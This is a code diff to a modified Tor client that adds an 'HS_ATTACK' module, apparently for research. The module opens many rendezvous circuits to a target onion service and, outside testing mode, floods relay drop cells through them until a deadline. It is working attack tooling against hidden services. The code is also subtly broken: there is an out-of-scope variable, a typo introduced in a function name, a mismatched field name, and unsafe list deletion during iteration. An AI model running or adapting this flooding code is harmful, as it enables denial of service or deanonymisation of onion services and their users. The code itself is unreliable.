@@ -20,31 +20,41 @@
  */
 static hs_rd_attack_t *attack_infos = NULL;
 
+
+static int launch_new_rendezvous(){
+  circ_info_t *circmap = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
+  circmap->extend_info = NULL;
+  circmap->introcirc = NULL;
+  circmap->state_intro = CIRC_NO_STATE;
+  circmap->state_rend = REND_CIRC_BUILDING;
+  log_debug(LD_REND, "HS_ATTACK: launching rend circuit");
+  circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
+      CIRCLAUNCH_IS_INTERNAL);
+  if (circmap->rendcirc) {
+    log_info(LD_REND, "HS_ATTACK : rendcircuit launched\n");
+    circmap->rendcirc->rend_data =
+      rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);
+    smartlist_add(attack_infos->rendcircs, circmap);
+    attack_infos->stats->nbr_rendcircs++;
+    return 0;
+  } else {
+    log_debug(LD_REND, "rendcircuit not launched\n");
+    circuit_free(circmap->rendcirc);
+    tor_free(circmap);
+    return -1;
+  }
+}
+
 static int 
 hs_attack_init_rendezvous_circuits(int nbr_circuits, const char *onionaddress) {
   log_debug(LD_REND,"HS_ATTACK : entering hs_attack_init_rendezvous_circuits\n");
   int c = 0;
   while (attack_infos->rendcircs->num_used < nbr_circuits) {
-    circ_info_t *circmap = (circ_info_t *) tor_malloc(sizeof(circ_info_t));
-    circmap->extend_info = NULL;
-    circmap->introcirc = NULL;
-    circmap->state_intro = CIRC_NO_STATE;
-    circmap->state_rend = REND_CIRC_BUILDING;
-    log_debug(LD_REND, "HS_ATTACK: launching rend circuit");
-    circmap->rendcirc = circuit_launch(CIRCUIT_PURPOSE_C_ESTABLISH_REND,
-        CIRCLAUNCH_IS_INTERNAL);
-    if (circmap->rendcirc) {
-      log_info(LD_REND, "HS_ATTACK : rendcircuit launched\n");
-      circmap->rendcirc->rend_data =
-        rend_data_client_create(onionaddress, NULL, NULL, REND_NO_AUTH);
-      smartlist_add(attack_infos->rendcircs, circmap);
-      attack_infos->stats->nbr_rendcircs++;
-    } else {
-      log_debug(LD_REND, "rendcircuit not launched\n");
-      c++;
-      tor_free(circmap);
-      if (c >= RETRY_THRESHOLD*nbr_circuits)
-        return -1;
+      if (launch_new_rendezvous() < 0){
+        c++;
+        if (c >= RETRY_THRESHOLD*nbr_circuits)
+          return -1;
+      }
     }
   }
   return 0;
@@ -191,7 +201,8 @@ void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
     if (circmap->state_rend == REND_CIRC_READY_FOR_RD)
       count_ready++;
   } SMARTLIST_FOREACH_END(circmap);
-  if (count_ready == attack_infos->rendcircs->num_used)
+  if (count_ready == attack_infos->rendcircs->num_used &&
+      !attack_infos->attack_already_launched) 
     //tell controller that we are ready to launch the attack
     control_event_hs_attack(HS_ATTACK_RD_READY);
 }
@@ -231,11 +242,12 @@ static int send_rd_cell(origin_circuit_t *circ){
                                    RELAY_COMMAND_DROP,
                                    NULL, 0, circ->cpath->prev) < 0)
     return -1;
-  log_debug(LD_REND, "HS_ATTACK: Send rd cell down circ\n");
+  //log_debug(LD_REND, "HS_ATTACK: Send rd cell down circ\n");
   return 0;
 }
 
 static void hs_attack_launch(time_t *until) {
+  attack_infos->attack_already_launched = 1; 
   if (HS_ATTACK_TESTING) {
     /*Just send 1 rd through each rendezvous circ*/
     SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
@@ -244,7 +256,41 @@ static void hs_attack_launch(time_t *until) {
       }
     } SMARTLIST_FOREACH_END(circmap);
   }
+  else {
+    // Send bunch of relay drop cells through all circuits until time_t *until said
+    // to stop
+    time_t now = time(NULL);
+    int num_cell_per_circuit = 100; //arbitrarya
+    int si = 0;
+    int i;
+    while(*until > now) {
+      SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t *, circmap) {
+        if (circmap->rendcirc->base_.state == CIRCUIT_STATE_OPEN && 
+              circmap->rend_state == REND_CIRC_READY_FOR_RD) {
+          for (i=0; i < num_cell_per_circuit; i++) {
+            if (send_rd_cell(circmap->rendcirc) < 0) {
+              //remove the circ; launch a new one.
+              circuit_free(circmap->rendcirc);
+              circuit_free(circmap->introcirc);
+              extend_info_free(circmap->extend_info);
+              smartlist_del(attack_infos->rendcircs, si);
+              attack_infos->stats->nbr_rendcircs--;
+              launch_new_rendezvous();
+            }
+          }
+        }
+        else {
+
+          // Might encounter a new rendezvouscircuit build above for which
+          // we have to build an introcirc
+        }
+        si++;
+      } SMARTLIST_FOREACH_END(circmap);
+      now = time(NULL);
+    }
+  }
 }
+
 
 static void free_hs_rd_attack(){
 
@@ -261,8 +307,17 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
     attack_infos->rendcircs = smartlist_new();
     attack_infos->stats = (hs_attack_stats_t *)  tor_malloc(sizeof(hs_attack_stats_t));
     attack_infos->retry_intro = 0;
+    attack_infos->nbr_circuits = nbr_circuits;
     attack_infos->stats->tot_cells = 0;
     attack_infos->stats->nbr_rendcircs = 0;
+    /* 
+     * attack_already_launched is used in the callback of rendezvous circuit when 
+     * RENDCELL2 is received.  In the init phase, we need to tell the controller
+     * when all rdvcircs are ready to launch the attack. But during the attack, it is
+     * possible to launch new rendezvous circs. In this case, we don't want to notice
+     * the controller.
+     * */
+    attack_infos->attack_already_launched = 0;
     /*attack_infos->extend_info = NULL;*/
     attack_infos->current_target = strdup(onionaddress);
     //attack_infos->rend_data = NULL;
@@ -275,7 +330,7 @@ hs_attack_entry_point(hs_attack_cmd_t cmd, const char *onionaddress,
         log_debug(LD_REND, "HS_ATTACK : not managed to create rendezvous circuits\n");
         return NULL;
       }
-      if (hs_attack_init_intro_circuit(attack_infos->retry_intro) < 0) {
+      if (hs_attack_initnit_intro_circuit(attack_infos->retry_intro) < 0) {
           log_debug(LD_REND, "HS_ATTACK : not managed to create intro circuit\n");
           return NULL; 
       }
